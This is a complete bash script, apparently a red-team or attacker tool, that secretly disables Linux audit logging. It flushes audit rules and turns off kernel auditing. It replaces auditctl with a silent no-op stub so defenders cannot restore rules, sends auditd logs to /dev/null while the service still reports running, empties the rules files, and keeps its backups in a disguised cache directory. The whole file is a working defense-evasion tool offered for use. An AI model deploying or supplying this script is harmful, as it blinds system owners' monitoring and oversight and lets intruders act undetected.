#!/usr/bin/env bash
# no-audit.sh — disable auditd and shadow auditctl with a no-op wrapper
#
# What this does:
#   - Flushes all audit rules and disables kernel auditing with the real auditctl
#   - Shadows auditctl with a no-op so blue team can't add rules back
#   - Redirects auditd log output to /dev/null (daemon stays "active (running)")
#   - Truncates all rules.d files so rules don't reload on restart
#
# Idempotent: exits early on install if backup already exists.
#
# Usage:
#   sudo ./no-audit.sh install
#   sudo ./no-audit.sh remove
#   sudo ./no-audit.sh status

set -euo pipefail

BACKUP_DIR="/var/cache/.syspkg"
AUDITD_CONF="/etc/audit/auditd.conf"

# ── helpers ───────────────────────────────────────────────────────────────────
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { err "Run as root"; exit 1; }; }

cmd_install() {
    require_root
    mkdir -p "$BACKUP_DIR"; chmod 700 "$BACKUP_DIR"

    # idempotency
    if [[ -f "${BACKUP_DIR}/auditctl.orig" ]]; then
        warn "Already deployed — backup exists at ${BACKUP_DIR}/auditctl.orig"
        warn "Run remove first to re-deploy"
        exit 0
    fi

    local AUDITCTL_LOC
    AUDITCTL_LOC=$(command -v auditctl 2>/dev/null || true)
    [[ -z "$AUDITCTL_LOC" ]] && { warn "auditctl not found — auditd may not be installed"; exit 0; }

    hdr "1/3  Disabling audit rules"
    # flush with the real binary before we swap it out
    "$AUDITCTL_LOC" -D 2>/dev/null || true
    "$AUDITCTL_LOC" -e 0 2>/dev/null || true   # disable kernel auditing
    info "Audit rules flushed, kernel auditing disabled"

    hdr "2/3  Shadowing auditctl"
    cp "$AUDITCTL_LOC" "${BACKUP_DIR}/auditctl.orig"
    cat > "$AUDITCTL_LOC" <<'EOF'
#!/usr/bin/env bash
# auditctl stub — exits 0 silently for all invocations
exit 0
EOF
    chmod 755 "$AUDITCTL_LOC"
    info "auditctl shadowed with no-op wrapper"

    hdr "3/3  Redirecting auditd logs + nuking rules.d"
    if [[ -f "$AUDITD_CONF" ]]; then
        cp "$AUDITD_CONF" "${BACKUP_DIR}/auditd.conf.orig"
        sed -i 's|^log_file\s*=.*|log_file = /dev/null|'  "$AUDITD_CONF"
        sed -i 's|^write_logs\s*=.*|write_logs = no|'      "$AUDITD_CONF"
        grep -q "^write_logs" "$AUDITD_CONF" || echo "write_logs = no" >> "$AUDITD_CONF"
        pkill -HUP auditd 2>/dev/null || true
        info "auditd.conf redirected to /dev/null — daemon stays active (running)"
    fi

    if [[ -d /etc/audit/rules.d ]]; then
        cp -r /etc/audit/rules.d "${BACKUP_DIR}/rules.d.orig"
        find /etc/audit/rules.d -name "*.rules" -exec truncate -s 0 {} \;
        info "rules.d truncated — rules won't reload on restart"
    fi
    [[ -f /etc/audit/audit.rules ]] && truncate -s 0 /etc/audit/audit.rules

    echo
    info "=== no-audit deployed ==="
    info "auditd shows: active (running) — but logs nothing and accepts no rules"
}

cmd_remove() {
    require_root

    local AUDITCTL_LOC
    AUDITCTL_LOC=$(command -v auditctl 2>/dev/null || true)

    hdr "Restoring auditctl"
    if [[ -f "${BACKUP_DIR}/auditctl.orig" ]]; then
        [[ -n "$AUDITCTL_LOC" ]] && cp "${BACKUP_DIR}/auditctl.orig" "$AUDITCTL_LOC" && chmod 755 "$AUDITCTL_LOC"
        rm -f "${BACKUP_DIR}/auditctl.orig"
        info "auditctl restored"
    else
        warn "No auditctl backup found"
    fi

    hdr "Restoring auditd.conf"
    if [[ -f "${BACKUP_DIR}/auditd.conf.orig" ]]; then
        cp "${BACKUP_DIR}/auditd.conf.orig" "$AUDITD_CONF"
        rm -f "${BACKUP_DIR}/auditd.conf.orig"
        pkill -HUP auditd 2>/dev/null || true
        info "auditd.conf restored and auditd reloaded"
    else
        warn "No auditd.conf backup found"
    fi

    hdr "Restoring rules.d"
    if [[ -d "${BACKUP_DIR}/rules.d.orig" ]]; then
        rm -rf /etc/audit/rules.d
        cp -r "${BACKUP_DIR}/rules.d.orig" /etc/audit/rules.d
        rm -rf "${BACKUP_DIR}/rules.d.orig"
        info "rules.d restored"
    else
        warn "No rules.d backup found"
    fi
}

cmd_status() {
    local AUDITCTL_LOC
    AUDITCTL_LOC=$(command -v auditctl 2>/dev/null || true)

    hdr "auditctl wrapper"
    if [[ -n "$AUDITCTL_LOC" ]] && grep -q "auditctl stub" "$AUDITCTL_LOC" 2>/dev/null; then
        info "SHADOWED  $AUDITCTL_LOC (no-op wrapper in place)"
    else
        warn "NOT SHADOWED  $AUDITCTL_LOC (real binary or not found)"
    fi

    hdr "auditd.conf"
    if grep -q "log_file = /dev/null" "$AUDITD_CONF" 2>/dev/null; then
        info "POISONED  log_file redirected to /dev/null"
    else
        warn "NOT POISONED  log_file is: $(grep "^log_file" "$AUDITD_CONF" 2>/dev/null || echo '(not found)')"
    fi

    hdr "Audit rules"
    local rule_count=0
    [[ -n "$AUDITCTL_LOC" ]] && rule_count=$(${BACKUP_DIR}/auditctl.orig -l 2>/dev/null | grep -vc "^$" || echo "?")
    info "Active rules (via real auditctl): ${rule_count}"

    hdr "Backups"
    for f in auditctl.orig auditd.conf.orig; do
        [[ -f "${BACKUP_DIR}/$f" ]] \
            && info "PRESENT  ${BACKUP_DIR}/$f" \
            || warn "MISSING  ${BACKUP_DIR}/$f"
    done
    [[ -d "${BACKUP_DIR}/rules.d.orig" ]] \
        && info "PRESENT  ${BACKUP_DIR}/rules.d.orig" \
        || warn "MISSING  ${BACKUP_DIR}/rules.d.orig"
}

case "${1:-install}" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *) echo "Usage: sudo $0 install|remove|status" ;;
esac
